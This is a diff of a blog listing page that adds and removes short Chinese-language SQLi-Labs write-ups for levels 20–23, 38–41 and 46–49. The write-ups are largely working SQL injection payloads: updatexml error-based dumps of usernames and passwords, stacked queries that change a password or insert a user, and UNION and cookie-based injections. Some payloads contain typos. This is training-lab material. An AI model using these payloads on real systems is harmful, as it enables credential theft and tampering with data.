@@ -71,6 +71,103 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-29" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/02/18/page-29/" class="article-date">
+  <time class="dt-published" datetime="2021-02-18T03:01:52.000Z" itemprop="datePublished">2021-02-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/02/18/page-29/">sqlilabs 46 47 48 49</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>46 数字型注入?sort=1 即可</p>
+<p>用报错注入吧 updatexml</p>
+<p>?sort=1 and updatexml(1,oncat(‘|’,(select group_concat(schema_name)from information_schemata.)),1) 爆数据库 太多了显示不下</p>
+<p>限制一下?sort=1 and updatexml(1,concat(‘|’,(select group_concat(schema_name)from information_schema.schemata limit 0,1)),1) 从第一个开始显示一次显示一个 limit 0，1 更0就可以</p>
+<p>?sort=1 and updatexml(1,concat(‘|’,(select group_concat(table_name)from information_schema.tables where table_schema=’security’)),1) 爆表</p>
+<p>?sort=1 and updatexml(1,concat(‘|’,(select group_concat(column_name)from information_schema.columns where table_schema=’security’ and table_name=’users’)),1) users表的列</p>
+<p>?sort=1 and updatexml(1,concat(‘~’,(select concat_ws(‘|’,id,username,password)from security.users limit 0,1)),1)  爆数据 </p>
+<p>47 就sort=1’ 多一个单引号 </p>
+<p>48 49 关闭了错误回显 没办法用报错注入了 要么盲注 要么神奇的sqlmap</p>
+<p>复制一下地址后面加个sort=1 剩下的和之前的用id的一样了 </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/18/page-29/" data-id="ckroqtflm000hyww7cb0rho8n" data-title="sqlilabs 46 47 48 49" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-28" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/02/15/page-28/" class="article-date">
+  <time class="dt-published" datetime="2021-02-15T11:47:07.000Z" itemprop="datePublished">2021-02-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/02/15/page-28/">sqlilabs 38 39 40 41</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>这几关都是堆叠注入的</p>
+<p>38关是堆叠注入就类似于一条命令里头执行两个操作 </p>
+<p>先来个?id=1  Dumb Dumb （字符型）</p>
+<p>字符型的那么就?id=1’;(和mysql执行完一条指令后一样以；结尾 )update users set password=’(自己设置)’ where username=’Dumb’; –+ </p>
+<p>之后再执行一下？id=1就会发现变成Dumb (自己设置)</p>
+<p>39 也是堆叠注入 这关是数字型 那么就简单点</p>
+<p>?id=1  然后?id=1;insert users values(21,’aaa’,1212’) 直接新增一个用户 </p>
+<p>?id=21 就可以查看到新增加的用户信息</p>
+<p>40闭合方式为?id=1’) </p>
+<p>41没有报错然后和39一样数字型 </p>
+<p>这几关的语句都可以一起用每一关都可以改密码创建新用户 。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/15/page-28/" data-id="ckroqtflm000gyww71wf16hcb" data-title="sqlilabs 38 39 40 41" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-page-27" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/02/15/page-27/" class="article-date">
@@ -451,108 +548,11 @@
 
 
   
-    <article id="post-page-16" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/01/31/page-16/" class="article-date">
-  <time class="dt-published" datetime="2021-01-31T08:35:05.000Z" itemprop="datePublished">2021-01-31</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/01/31/page-16/">sqlilabs 23</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>z这关就很神奇了 末尾的闭合符号– 和#均被过滤  那么只好用单引号闭合 因为单引号里面的不会被执行 所以用and 闭合 ?id=1’ and  ‘1’=’1</p>
-<p>测试回显 ?id=-1’  union select 1,2,3 and ‘1’=’1   显示的消息是 your login name：2 your password：1</p>
-<p>那么就从select1，2，3的2那边入手</p>
-<p>?id=-1’ union select 1,database(),3 and ‘1’=’1 得到库名 security </p>
-<p>?id=-1’ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),3 and ‘1’=’1 爆表明</p>
-<p>?id=-1’ union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=’security’ and table_name=’users’),3 and ‘1’=’1 爆列名</p>
-<p>?id=-1’ union select 1,(select group_concat(username,password) from users),3 and ‘1’=’1 查数据</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/01/31/page-16/" data-id="ckroqtfle0007yww7bem6d915" data-title="sqlilabs 23" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-15" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/01/31/page-15/" class="article-date">
-  <time class="dt-published" datetime="2021-01-31T06:43:11.000Z" itemprop="datePublished">2021-01-31</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/01/31/page-15/">sqlilabs 20 21  22 手动注入</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>首先20关过滤了post注入 就只好从cookie入手(用火狐的插件hackbar)</p>
-<p>先登陆一下获取cookie信息 <img src="D:\blog\source_posts\images\image-20210131141955567.png" alt="image-20210131141955567"></p>
-<p>稍微知道一下cookie的格式 然后判断为字符型注入</p>
-<p>uname=aaa’ ordey by 4# 获取位数 数字一个个尝试</p>
-<p><img src="D:\blog\source_posts\images\image-20210131142538658.png" alt="image-20210131142538658"></p>
-<p>到出现这种情况</p>
-<p>然后union语句了</p>
-<p>uname =aaa’ union select 1,2,3 #</p>
-<p>uname=aaa’ union select 1,2,database() # (获取当前使用的数据库名字) 执行后是security</p>
-<p>uname=aaa’ union select 1,2,group_concat(table_name) from informatin_schema.tables where table_schema=‘security’ # (获得所有表名)</p>
-<p>uname=aaa’ union select 1,2,group_concat(columns_name) from information_schema.columns where table_schema=’security’ and table name=’users’ # 获得字段 </p>
-<p>uname=aaa’ union select 1,2,group_concat(username,0x7e,password)from security,users # 获得字段的数据 </p>
-<p>或者用这个语句uname=aaa’ union select 1,2,group_concat(concat_ws(‘-‘,id,username,password)) from users # </p>
-<p>21关稍微变一下用base64 编码一下uname= 之后的内容即可和20一样的 注入符号方式也不一样 构建‘）这样的注入符号   22也是一样就注入符号为” 双引号 然后也是base64 编码一下</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/01/31/page-15/" data-id="ckroqtfld0006yww71nyt6oa3" data-title="sqlilabs 20 21  22 手动注入" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
     
-    <a class="extend prev" rel="prev" href="/page/5/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/7/">Next &raquo;</a>
+    <a class="extend prev" rel="prev" href="/page/5/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/7/">Next &raquo;</a>
   </nav>
 
 </section>
@@ -584,6 +584,14 @@
       <ul>
         
           <li>
+            <a href="/2021/07/29/page-90/">buuctf  misc zip</a>
+          </li>
+        
+          <li>
+            <a href="/2021/07/29/page-89/">misc2</a>
+          </li>
+        
+          <li>
             <a href="/2021/07/29/page-88/">羊城杯 2020逃离东南亚</a>
           </li>
         
@@ -593,14 +601,6 @@
         
           <li>
             <a href="/2021/07/29/page-86/">CISCN2019 华北赛区 Day1 Web1Dropbox</a>
-          </li>
-        
-          <li>
-            <a href="/2021/07/29/page-85/">极客大挑战 2019RCE ME</a>
-          </li>
-        
-          <li>
-            <a href="/2021/07/29/page-84/">CISCN2019 华北赛区 Day1 Web2ikun</a>
           </li>
         
       </ul>
